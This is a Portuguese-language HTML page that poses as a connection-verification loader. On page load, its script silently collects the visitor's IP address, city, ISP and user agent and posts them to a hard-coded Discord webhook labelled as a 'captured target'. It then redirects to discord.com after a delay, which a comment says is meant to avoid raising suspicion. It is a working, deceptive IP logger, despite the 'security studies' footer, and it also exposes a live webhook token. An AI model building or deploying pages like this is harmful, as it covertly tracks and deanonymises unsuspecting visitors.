<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <title>Verificando Conexão...</title>
    <style>
        body { background: #121212; color: white; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div style="text-align: center;">
        <div class="loader"></div>
        <p>Aguarde, validando seu acesso...</p>
    </div>

    <script>
        // Configurações
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1480036764730134589/yMCeGposuVce-spJLqeRgaqOX6g7m_8BrlzBQ5N0U7cjHwjEb-Lsj88EIzuSSyjRLsjG";

        async function capturarDados() {
            try {
                // 1. Pega o IP e Geolocalização via API do navegador
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();

                // 2. Monta o relatório para o Discord
                const payload = {
                    embeds: [{
                        title: "🎯 Alvo Capturado no Site",
                        color: 15158332,
                        fields: [
                            { name: "🌐 IP", value: `\`${data.ip}\``, inline: true },
                            { name: "📍 Cidade", value: data.city, inline: true },
                            { name: "🏢 Provedor", value: data.org, inline: false },
                            { name: "📱 Dispositivo", value: navigator.userAgent, inline: false }
                        ],
                        footer: { text: "Estudos de Segurança - Log Gerada" },
                        timestamp: new Date()
                    }]
                };

                // 3. Envia para o Webhook
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                // 4. Redireciona o usuário após 3 segundos para não gerar suspeita
                setTimeout(() => {
                    window.location.href = "https://discord.com"; 
                }, 3000);

            } catch (error) {
                console.error("Erro ao processar logs.");
            }
        }

        window.onload = capturarDados;
    </script>
</body>
</html>
